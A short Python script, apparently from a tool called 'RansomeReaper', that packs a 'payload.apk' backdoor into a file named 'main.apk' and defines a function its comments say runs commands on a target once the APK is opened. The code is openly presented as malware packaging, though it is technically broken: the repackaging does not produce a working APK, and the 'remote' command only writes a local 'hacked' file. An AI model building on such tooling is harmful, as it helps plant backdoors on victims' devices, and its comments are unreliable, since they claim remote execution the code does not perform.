import os
import shutil
import subprocess
import zipfile

# Define the path for the directory
directory_path = r"D:\RansomeReaper 2.1\Obfusecapk"

# Create the directory if it doesn't exist
if not os.path.exists(directory_path):
    os.makedirs(directory_path)

# Create a new directory for our malicious APK in the specified directory
malicious_dir = os.path.join(directory_path, "malicious_apk")
os.makedirs(malicious_dir)

# Copy your payload (backdoor) file to the directory
shutil.copy("payload.apk", malicious_dir)

# Create a ZIP file with the name "main.apk" in the specified directory for the malicious APK
apk_path = os.path.join(directory_path, "main.apk")
with zipfile.ZipFile(apk_path, "w") as zf:
    for folderName, subfolders, filenames in os.walk(malicious_dir):
        for filename in filenames:
            filePath = os.path.join(folderName, filename)
            zf.write(filePath, os.path.relpath(filePath, malicious_dir))

# Execute commands on the target machine once the APK is opened
def execute_command(command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output, error = result.communicate()
    return output, error

# Example of executing a command remotely
command_to_execute = "echo 'You have been hacked!' > hacked.txt"
output, error = execute_command(command_to_execute)

# Clean up temporary directory
shutil.rmtree(malicious_dir)